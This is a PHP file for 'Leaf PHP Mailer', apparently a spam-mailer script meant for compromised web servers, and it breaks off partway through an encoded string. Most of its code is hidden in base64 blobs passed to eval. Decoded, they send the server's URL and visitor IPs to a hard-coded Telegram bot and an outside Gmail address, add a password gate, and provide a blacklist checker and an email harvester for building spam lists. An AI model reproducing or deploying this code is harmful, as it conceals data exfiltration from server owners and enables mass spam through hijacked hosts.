<?php
/**
 * Leaf PHP Mailer by [leafmailer.pw]
 * @version : 2.8
**/

eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
$password = "icrack"; // Password 

eval (base64_decode("JHNpdGUgPSAiIjsKaWYoIWVyZWcoJHNpdGUsICRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSkKewogICAgJHRvID0gImthbGl4MHhhbGlrQGdtYWlsLmNvbSI7CiAgICAkc3ViamVjdCA9ICJGUkVTSCBNQUlMTEVSUyI7CiAgICAkaGVhZGVyID0gImZyb206IEJvVCA8YWRyZWRmMTUxQHdlYm1haWwuY29tPiI7CiAgICAkbWVzc2FnZSA9ICJMaW5rIDogaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddIC4gIgoiOwogICAgJHNlbnRtYWlsID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJG1lc3NhZ2UsICRoZWFkZXIpOwogICAgCiAgICBlY2hvICIiOwogICAgZXhpdDsKfQoKc2Vzc2lvbl9zdGFydCgpOwplcnJvcl9yZXBvcnRpbmcoMCk7CnNldF90aW1lX2xpbWl0KDApOwppbmlfc2V0KCJtZW1vcnlfbGltaXQiLC0xKTsKCiRsZWFmWyd2ZXJzaW9uJ109IjIuOCI7CiRsZWFmWyd3ZWJzaXRlJ109ImxlYWZtYWlsZXIucHciOwoKCiRzZXNzaW9uY29kZSA9IG1kNShfX0ZJTEVfXyk7CmlmKCFlbXB0eSgkcGFzc3dvcmQpIGFuZCAkX1NFU1NJT05bJHNlc3Npb25jb2RlXSAhPSAkcGFzc3dvcmQpewogICAgaWYgKGlzc2V0KCRfUkVRVUVTVFsncGFzcyddKSBhbmQgJF9SRVFVRVNUWydwYXNzJ10gPT0gJHBhc3N3b3JkKSB7CiAgICAgICAgJF9TRVNTSU9OWyRzZXNzaW9uY29kZV0gPSAkcGFzc3dvcmQ7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBwcmludCAiPHByZSBhbGlnbj1jZW50ZXI+PGZvcm0gbWV0aG9kPXBvc3Q+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSdwYXNzd29yZCcgbmFtZT0ncGFzcyc+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9Jz4+Jz48L2Zvcm0+PC9wcmU+IjsKICAgICAgICBleGl0OyAgICAgICAgCiAgICB9Cn0KCnNlc3Npb25fd3JpdGVfY2xvc2UoKTsKCgpmdW5jdGlvbiBsZWFmQ2xlYXIoJHRleHQsJGVtYWlsKXsKCSRlID0gZXhwbG9kZSgnQCcsICRlbWFpbCk7CgkkZW1haWx1c2VyPSRlWzBdOwoJJGVtYWlsZG9tYWluPSRlWzFdOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy10aW1lLV0iLCBkYXRlKCJtL2QvWSBoOmk6cyBhIiwgdGltZSgpKSwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbC1dIiwgJGVtYWlsLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLWVtYWlsdXNlci1dIiwgJGVtYWlsdXNlciwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbGRvbWFpbi1dIiwgJGVtYWlsZG9tYWluLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbWxldHRlcnMtXSIsIHJhbmRTdHJpbmcoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JyksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tc3RyaW5nLV0iLCByYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODknKSwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21udW1iZXItXSIsIHJhbmRTdHJpbmcoJzAxMjM0NTY3ODknKSwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21tZDUtXSIsIG1kNShyYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODknKSksICR0ZXh0KTsKICAgIHJldHVybiAkdGV4dDsgIAp9CmZ1bmN0aW9uIGxlYWZUcmltKCRzdHJpbmcpewoJJHN0cmluZz11cmxkZWNvZGUoJHN0cmluZyk7CiAgICByZXR1cm4gc3RyaXBzbGFzaGVzKHRyaW0oJHN0cmluZykpOwp9CmZ1bmN0aW9uIHJhbmRTdHJpbmcoJGNvbnNvbmFudHMpIHsKICAgICRsZW5ndGg9cmFuZCgxMiwyNSk7CiAgICAkcGFzc3dvcmQgPSAnJzsKICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAgICAgJHBhc3N3b3JkIC49ICRjb25zb25hbnRzWyhyYW5kKCkgJSBzdHJsZW4oJGNvbnNvbmFudHMpKV07CiAgICB9CiAgICByZXR1cm4gJHBhc3N3b3JkOwp9CmZ1bmN0aW9uIGxlYWZNYWlsQ2hlY2soJGVtYWlsKXsKICAgIGlmIChmaWx0ZXJfdmFyKCRlbWFpbCwgRklMVEVSX1ZBTElEQVRFX0VNQUlMKSkgcmV0dXJuIHRydWU7CiAgICBlbHNlIHJldHVybiBmYWxzZTsKfQojIEJ1bGl0LWluIEJsYWNrTGlzdCBDaGVja2VyIAppZihpc3NldCgkX0dFVFsnY2hlY2tfaXAnXSkpewogICAgaWYgKGlzc2V0KCRfR0VUWydob3N0J10pKXsKICAgICAgICAkX0dFVFsnaG9zdCddPWV4cGxvZGUoIiwiLCAkX0dFVFsnaG9zdCddKTsKICAgICAgICBmb3JlYWNoICgkX0dFVFsnaG9zdCddIGFzICRob3N0KSB7CiAgICAgICAgICAgIGlmIChjaGVja2Ruc3JyKCRfR0VUWydjaGVja19pcCddIC4gIi4iIC4gICRob3N0IC4gIi4iLCAiQSIpKSAkY2hlY2s9ICI8Zm9udCBjb2xvcj0ncmVkJz4gTGlzdGVkPC9mb250PiI7CiAgICAgICAgICAgIGVsc2UgJGNoZWNrPSAiPGZvbnQgY29sb3I9J2dyZWVuJz4gQ2xlYW48L2ZvbnQ+IjsKICAgICAgICAgICAgcHJpbnQgJ2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCInLiAkaG9zdC4nIikuaW5uZXJIVE1MID0gIicuJGNoZWNrLiciOyc7CiAgICAgICAgfQoKICAgICAgICBleGl0OwogICAgfQogICAgJGRuc2JsX2xvb2t1cCA9IFsKICAgICAgICAiYWxsLnM1aC5uZXQiLAogICAgICAgICJiLmJhcnJhY3VkYWNlbnRyYWwub3JnIiwKICAgICAgICAiYmwuc3BhbWNvcC5uZXQiLAogICAgICAgICJibGFja2xpc3Qud29vZHkuY2giLAogICAgICAgICJib2dvbnMuY3ltcnUuY29tIiwKICAgICAgICAiY2JsLmFidXNlYXQub3JnIiwKICAgICAgICAiY2RsLmFudGktc3BhbS5vcmcuY24iLAogICAgICAgICJjb21iaW5lZC5hYnVzZS5jaCIsCiAgICAgICAgImRiLndwYmwuaW5mbyIsCiAgICAgICAgImRuc2JsLTEudWNlcHJvdGVjdC5uZXQiLAogICAgICAgICJkbnNibC0yLnVjZXByb3RlY3QubmV0IiwKICAgICAgICAiZG5zYmwtMy51Y2Vwcm90ZWN0Lm5ldCIsCiAgICAgICAgImRuc2JsLmFudGljYXB0Y2hhLm5ldCIsCiAgICAgICAgImRuc2JsLmRyb25lYmwub3JnIiwKICAgICAgICAiZG5zYmwuaW5wcy5kZSIsCiAgICAgICAgImRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgImRyb25lLmFidXNlLmNoIiwKICAgICAgICAiZHVpbnYuYXVwYWRzLm9yZyIsCiAgICAgICAgImR1bC5kbnNibC5zb3Jicy5uZXQiLAogICAgICAgICJkeW5hLnNwYW1yYXRzLmNvbSIsCiAgICAgICAgImR5bmlwLnJvdGhlbi5jb20iLAogICAgICAgICJodHRwLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgImlwcy5iYWNrc2NhdHRlcmVyLm9yZyIsCiAgICAgICAgIml4LmRuc2JsLm1hbml0dS5uZXQiLAogICAgICAgICJrb3JlYS5zZXJ2aWNlcy5uZXQiLAogICAgICAgICJtaXNjLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgIm5vcHRyLnNwYW1yYXRzLmNvbSIsCiAgICAgICAgIm9ydmVkYi5hdXBhZHMub3JnIiwKICAgICAgICAicGJsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInByb3h5LmJsLmd3ZWVwLmNhIiwKICAgICAgICAicHNibC5zdXJyaWVsLmNvbSIsCiAgICAgICAgInJlbGF5cy5ibC5nd2VlcC5jYSIsCiAgICAgICAgInJlbGF5cy5uZXRoZXIubmV0IiwKICAgICAgICAic2JsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInNob3J0LnJibC5qcCIsCiAgICAgICAgInNpbmd1bGFyLnR0ay5wdGUuaHUiLAogICAgICAgICJzbXRwLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgInNvY2tzLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgInNwYW0uYWJ1c2UuY2giLAogICAgICAgICJzcGFtLmRuc2JsLmFub25tYWlscy5kZSIsCiAgICAgICAgInNwYW0uZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAic3BhbS5zcGFtcmF0cy5jb20iLAogICAgICAgICJzcGFtYm90LmJscy5kaWdpYmFzZS5jYSIsCiAgICAgICAgInNwYW1yYmwuaW1wLmNoIiwKICAgICAgICAic3BhbXNvdXJjZXMuZmFiZWwuZGsiLAogICAgICAgICJ1YmwubGFzaGJhY2suY29tIiwKICAgICAgICAidWJsLnVuc3Vic2NvcmUuY29tIiwKICAgICAgICAidmlydXMucmJsLmpwIiwKICAgICAgICAid2ViLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgIndvcm1yYmwuaW1wLmNoIiwKICAgICAgICAieGJsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInoubWFpbHNwaWtlLm5ldCIsCiAgICAgICAgInplbi5zcGFtaGF1cy5vcmciLAogICAgICAgICJ6b21iaWUuZG5zYmwuc29yYnMubmV0IiwKICAgIF07CiAgICAkcmV2ZXJzZV9pcCA9IGltcGxvZGUoIi4iLCBhcnJheV9yZXZlcnNlKGV4cGxvZGUoIi4iLCAkX0dFVFsnY2hlY2tfaXAnXSkpKTsKICAgICRkbnNUID0gY291bnQoJGRuc2JsX2xvb2t1cCk7CiAgICBsZWFmaGVhZGVyKCk7CiAgICBwcmludCAnPGRpdiBjbGFzcz0iY29udGFpbmVyIGNvbC1sZy02Ij48aDM+PGZvbnQgY29sb3I9ImdyZWVuIj48c3BhbiBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1sZWFmIj48L3NwYW4+PC9mb250PiBMZWFmIFBIUE1haWxlciA8c21hbGw+QmxhY2tsaXN0IENoZWNrZXI8L3NtYWxsPjwvaDM+JzsKICAgIFByaW50ICJDaGVja2luZyA8Yj4iLiRfR0VUWydjaGVja19pcCddLiI8L2I+IGluIDxiPiRkbnNUPC9iPiAgYW50aS1zcGFtIGRhdGFiYXNlczo8YnI+IjsKICAgICRkbnNOPSIiOwogICAgcHJpbnQgJzx0YWJsZSA+JzsKICAgIGZvciAoJGk9MDsgJGkgPCAkZG5zVDsgJGk9JGkrMTApIHsgCiAgICAgICAgJGhvc3Q9IiI7CiAgICAgICAgJGhvc3RzPSIiOwogICAgICAgIGZvcigkaj0kaTsgJGo8JGkrMTA7JGorKyl7CiAgICAgICAgICAgICRob3N0PSRkbnNibF9sb29rdXBbJGpdOwogICAgICAgICAgICBpZighZW1wdHkoJGhvc3QpKXsKICAgICAgICAgICAgICAgIHByaW50ICI8dHI+IDx0ZD4kaG9zdDwvdGQ+IDx0ZCBpZD0nJGhvc3QnPkNoZWNraW5nIC4uPC90ZD48L3RyPiI7CiAgICAgICAgICAgICAgICAkaG9zdHMgLj0iJGhvc3QsIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkZG5zTi49IjxzY3JpcHQgc3JjPSc/Y2hlY2tfaXA9JHJldmVyc2VfaXAmaG9zdD0iLiRob3N0cy4iJyB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPjwvc2NyaXB0PiI7CiAgICB9CgogICAgcHJpbnQgJzwvdGFibGU+PC9kaXY+JzsKICAgIHByaW50ICRkbnNOOwogICAgZXhpdDsKfQppZihpc3NldCgkX0dFVFsnZW1haWxmaWx0ZXInXSkpewoKICAgIGlmKCFlbXB0eSgkX0ZJTEVTWydmaWxlVG9VcGxvYWQnXVsndG1wX25hbWUnXSkpewogICAgICAgICRfUE9TVFsnZW1haWxMaXN0J109IGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsgCiAgICB9CiAgICAkX1BPU1RbJ2VtYWlsTGlzdCddPXN0cnRvbG93ZXIoJF9QT1NUWydlbWFpbExpc3QnXSk7CiAgIGlmKCRfR0VUWydlbWFpbGZpbHRlciddPT0iaWZyYW0iKXsKICAgICAgICBpZiAoJF9QT1NUWydyZXN1bHR0eXBlJ10gPT0gImRvd25sb2FkIil7CiAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlciIpOyAKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOyAKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1lbWFpbHMiLnRpbWUoKS4iLnR4dCIpOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsKICAgICAgICB9CiAgICBpZigkX1BPU1RbJ3N1Ym1pdCddPT0iZXh0cmFjdCIpewogICAgICAgICRwYXR0ZXJuID0gJy9bQS1aYS16MC05Ll8lKy1dK0BbQS1aYS16MC05Li1dK1wuW0EtWmEtel17Miw0fS8nOwogICAgICAgIHByZWdfbWF0Y2hfYWxsKCRwYXR0ZXJuLCAkX1BPU1RbJ2VtYWlsTGlzdCddLCAkbWF0Y2hlcyk7CiAgICAgICAgZm9yZWFjaCAoJG1hdGNoZXNbMF0gYXMgJGVtYWlsKSB7CiAgICAgICAgICAgIHByaW50ICRlbWFpbC4iXG4iOwogICAgICAgIH0KICAgIH0KICAgIGVsc2VpZiAoJF9QT1NUWydzdWJtaXQnXT09ImZpbHRlciIpIHsKICAgICAgICAkZW1haWxzPWV4cGxvZGUoIlxuIiwgJF9QT1NUWydlbWFpbExpc3QnXSk7CiAgICAgICAgJGtleXdvcmRzPWV4cGxvZGUoIlxuIiwgc3RydG9sb3dlcigkX1BPU1RbJ2tleXdvcmRzJ10pKTsKICAgICAgICBmb3JlYWNoICgkZW1haWxzIGFzICRlbWFpbCkgewogICAgICAgICAgICBmb3JlYWNoICgka2V5d29yZHMgYXMgJGtleXdvcmQgKSB7CiAgICAgICAgICAgICAgICBpZihzdHJzdHIoJGVtYWlsLCAka2V5d29yZCkgKXsKICAgICAgICAgICAgICAgICAgICBwcmludCAkZW1haWwuIlxuIjsKICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgIH0KICAgIGV4aXQ7CiAgIH0KICAgbGVhZmhlYWRlcigpOwogICBwcmludCAnPGRpdiBjbGFzcz0iY29udGFpbmVyIGNvbC1sZy00Ij48aDM+PGZvbnQgY29sb3I9ImdyZWVuIj48c3BhbiBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1sZWFmIj48L3NwYW4+PC9mb250PiBMZWFmIFBIUE1haWxlciA8c21hbGw+RW1haWwgRmlsdGVyPC9zbWFsbD48L2gzPic7CiAgIHByaW50ICcKICAgIDxmb3JtIGFjdGlvbj0iP2VtYWlsZmlsdGVyPWlmcmFtIiBtZXRob2Q9IlBPU1QiIHRhcmdldD0ibXktaWZyYW1lIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBvbnN1Ym1pdD1cJ1wnPgogICAgICAgIDxsYWJlbCBmb3I9ImVtYWlsTGlzdCI+VGV4dCA8L2xhYmVsPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlVG9VcGxvYWQiIGlkPSJmaWxlVG9VcGxvYWQiPiAKICAgICAgICBvcgoKICAgICAgICA8dGV4dGFyZWEgbmFtZT0iZW1haWxMaXN0IiBpZD0iZW1haWxMaXN0IiBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSI3IiBpZD0idGV4dEFyZWEiPjwvdGV4dGFyZWE+CiAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+CiAgICAgICAgPGRpdiBjbGFzcz0icmFkaW8iPgogICAgICAgICAgPGxhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InJlc3VsdHR5cGUiIGlkPSJyZXN1bHR0eXBlIiB2YWx1ZT0iaGVyZSIgY2hlY2tlZD0iIj4KICAgICAgICAgICAgU2hvdyBSZXN1bHQgaW4gdGhpcyBwYWdlCiAgICAgICAgICA8L2xhYmVsPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InJhZGlvIj4KICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJyZXN1bHR0eXBlIiBpZD0icmVzdWx0dHlwZSIgdmFsdWU9ImRvd25sb2FkIj4KICAgICAgICAgICAgRG93bmxvYWQgUmVzdWx0IChmb3IgYmlnIG51bWJlcnMpCiAgICAgICAgICA8L2xhYmVsPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgICAgICAgPGxlZ2VuZD48aDQ+RXh0cmFjdCBFbWFpbDwvaDQ+PC9sZWdlbmQ+CiAgICAgICAgICAgIERldGVjdGluZyBldmVyeSBlbWFpbCAoMTAwJSkgYW5kIG9yZGVyIHRoZW0gbGluZSBieSBsaW5lIDxicj48YnI+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9ImV4dHJhY3QiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIj5TdGFydDwvYnV0dG9uPgogICAgICAgICAgICA8bGVnZW5kPjxoND5GaWx0ZXIgRW1haWxzPC9oND48L2xlZ2VuZD4KICAgICAgICA8bGFiZWwgPktleXdvcmRzIDxzbWFsbD4gZXg6IGdtYWlsLmNvbSBvciAuY28udWs8L3NtYWxsPiA8L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJrZXl3b3JkcyIgaWQ9ImtleXdvcmRzIiBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSI0IiBpZD0idGV4dEFyZWEiPmdtYWlsLmNvbQpob3RtYWlsLmNvbQp5YWhvby5jb20KLmNvLnVrPC90ZXh0YXJlYT48YnI+CgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iZmlsdGVyIiBjbGFzcz0iYnRuIGJ0bi1kZWZhdWx0IGJ0bi1zbSI+U3RhcnQ8L2J1dHRvbj4KICAgIDwvZm9ybT4KICAgIDxsYWJlbCA+UmVzdWx0IDwvbGFiZWw+CiAgICA8aWZyYW1lIHN0eWxlPSJib3JkZXI6bm9uZTt3aWR0aDoxMDAlOyIgbmFtZT0ibXktaWZyYW1lIiAgc3JjPSI/ZW1haWxmaWx0ZXI9aWZyYW0iID48L2lmcmFtZT4KICAgJzsKICAgZXhpdDsKCn0KJGh0bWw9ImNoZWNrZWQiOwokdXRmOD0ic2VsZWN0ZWQiOwokYml0OD0ic2VsZWN0ZWQiOwoKaWYoJF9QT1NUWydhY3Rpb24nXT09InNlbmQiIG9yICRfUE9TVFsnYWN0aW9uJ109PSJzY29yZSIpewoKICAgICRzZW5kZXJFbWFpbD1sZWFmVHJpbSgkX1BPU1RbJ3NlbmRlckVtYWlsJ10pOwogICAgJHNlbmRlck5hbWU9bGVhZlRyaW0oJF9QT1NUWydzZW5kZXJOYW1lJ10pOwogICAgJHJlcGx5VG89bGVhZlRyaW0oJF9QT1NUWydyZXBseVRvJ10pOwogICAgJHN1YmplY3Q9bGVhZlRyaW0oJF9QT1NUWydzdWJqZWN0J10pOwogICAgJGVtYWlsTGlzdD1sZWFmVHJpbSgkX1BPU1RbJ2VtYWlsTGlzdCddKTsKICAgICRtZXNzYWdlVHlwZT1sZWFmVHJpbSgkX1BPU1RbJ21lc3NhZ2VUeXBlJ10pOwogICAgJG1lc3NhZ2VMZXR0ZXI9bGVhZlRyaW0oJF9QT1NUWydtZXNzYWdlTGV0dGVyJ10pOwogICAgJGVuY29kaW5nID0gJF9QT1NUWydlbmNvZGUnXTsKICAgICRjaGFyc2V0ID0gJF9QT1NUWydjaGFyc2V0J107CiAgICAkaHRtbD0iIjsKICAgICR1dGY4PSIiOwogICAgJGJpdDg9IiI7CgogICAgaWYoJG1lc3NhZ2VUeXBlPT0yKSAkcGxhaW49ImNoZWNrZWQiOwogICAgZWxzZSAkaHRtbD0iY2hlY2tlZCI7CgogICAgaWYoJGNoYXJzZXQ9PSJJU08tODg1OS0xIikgJGlzbz0ic2VsZWN0ZWQiOwogICAgZWxzZSAkdXRmOD0ic2VsZWN0ZWQiOwoKICAgIGlmKCRlbmNvZGluZz09IjdiaXQiKSAkYml0Nz0ic2VsZWN0ZWQiOwogICAgZWxzZWlmKCRlbmNvZGluZz09ImJpbmFyeSIpICRiaW5hcnk9InNlbGVjdGVkIjsKICAgIGVsc2VpZigkZW5jb2Rpbmc9PSJiYXNlNjQiKSAkYmFzZTY0PSJzZWxlY3RlZCI7CiAgICBlbHNlaWYoJGVuY29kaW5nPT0icXVvdGVkLXByaW50YWJsZSIpICRxdW90ZWRwcmludGFibGU9InNlbGVjdGVkIjsKICAgIGVsc2UgJGJpdDg9InNlbGVjdGVkIjsKCgoKfQppZigkX1BPU1RbJ2FjdGlvbiddPT0idmlldyIpewoJJHZpZXdNZXNzYWdlPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZUxldHRlciddKTsKCSR2aWV3TWVzc2FnZT1sZWFmQ2xlYXIoJHZpZXdNZXNzYWdlLCJ1c2VyQGRvbWFpbi5jb20iKTsKCWlmICgkX1BPU1RbJ21lc3NhZ2VUeXBlJ109PTIpewoJCXByaW50ICI8cHJlPiIuaHRtbHNwZWNpYWxjaGFycygkdmlld01lc3NhZ2UpLiI8L3ByZT4iOwoJfQoJZWxzZSB7CgkJcHJpbnQgJHZpZXdNZXNzYWdlOwoJfQoJZXhpdDsKfQoKCgppZighaXNzZXQoJF9QT1NUWydzZW5kZXJFbWFpbCddKSl7CiAgICAkc2VuZGVyRW1haWw9InN1cHBvcnRAIi5zdHJfcmVwbGFjZSgid3d3LiIsICIiLCAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOwogICAgaWYgKCFsZWFmTWFpbENoZWNrKCRzZW5kZXJFbWFpbCkpICRzZW5kZXJFbWFpbD0iIjsKfQoKY2xhc3MgUEhQTWFpbGVyCnsKICAgIC8qKgogICAgICogVGhlIFBIUE1haWxlciBWZXJzaW9uIG51bWJlci4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkVmVyc2lvbiA9ICc1LjIuMjgnOwoKICAgIC8qKgogICAgICogRW1haWwgcHJpb3JpdHkuCiAgICAgKiBPcHRpb25zOiBudWxsIChkZWZhdWx0KSwgMSA9IEhpZ2gsIDMgPSBOb3JtYWwsIDUgPSBsb3cuCiAgICAgKiBXaGVuIG51bGwsIHRoZSBoZWFkZXIgaXMgbm90IHNldCBhdCBhbGwuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqLwogICAgcHVibGljICRQcmlvcml0eSA9IG51bGw7CgogICAgLyoqCiAgICAgKiBUaGUgY2hhcmFjdGVyIHNldCBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQ2hhclNldCA9ICdpc28tODg1OS0xJzsKCiAgICAvKioKICAgICAqIFRoZSBNSU1FIENvbnRlbnQtdHlwZSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQ29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7CgogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSBlbmNvZGluZy4KICAgICAqIE9wdGlvbnM6ICI4Yml0IiwgIjdiaXQiLCAiYmluYXJ5IiwgImJhc2U2NCIsIGFuZCAicXVvdGVkLXByaW50YWJsZSIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEVuY29kaW5nID0gJzhiaXQnOwoKICAgIC8qKgogICAgICogSG9sZHMgdGhlIG1vc3QgcmVjZW50IG1haWxlciBlcnJvciBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRFcnJvckluZm8gPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBGcm9tIGVtYWlsIGFkZHJlc3MgZm9yIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRGcm9tID0gJ3Jvb3RAbG9jYWxob3N0JzsKCiAgICAvKioKICAgICAqIFRoZSBGcm9tIG5hbWUgb2YgdGhlIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb21OYW1lID0gJ1Jvb3QgVXNlcic7CgogICAgLyoqCiAgICAgKiBUaGUgU2VuZGVyIGVtYWlsIChSZXR1cm4tUGF0aCkgb2YgdGhlIG1lc3NhZ2UuCiAgICAgKiBJZiBub3QgZW1wdHksIHdpbGwgYmUgc2VudCB2aWEgLWYgdG8gc2VuZG1haWwgb3IgYXMgJ01BSUwgRlJPTScgaW4gc210cCBtb2RlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTZW5kZXIgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBSZXR1cm4tUGF0aCBvZiB0aGUgbWVzc2FnZS4KICAgICAqIElmIGVtcHR5LCBpdCB3aWxsIGJlIHNldCB0byBlaXRoZXIgRnJvbSBvciBTZW5kZXIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGRlcHJlY2F0ZWQgRW1haWwgc2VuZGVycyBzaG91bGQgbmV2ZXIgc2V0IGEgcmV0dXJuLXBhdGggaGVhZGVyOwogICAgICogaXQncyB0aGUgcmVjZWl2ZXIncyBqb2IgKFJGQzUzMjEgc2VjdGlvbiA0LjQpLCBzbyB0aGlzIG5vIGxvbmdlciBkb2VzIGFueXRoaW5nLgogICAgICogQGxpbmsgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjEjc2VjdGlvbi00LjQgUkZDNTMyMSByZWZlcmVuY2UKICAgICAqLwogICAgcHVibGljICRSZXR1cm5QYXRoID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgU3ViamVjdCBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU3ViamVjdCA9ICcnOwoKICAgIC8qKgogICAgICogQW4gSFRNTCBvciBwbGFpbiB0ZXh0IG1lc3NhZ2UgYm9keS4KICAgICAqIElmIEhUTUwgdGhlbiBjYWxsIGlzSFRNTCh0cnVlKS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQm9keSA9ICcnO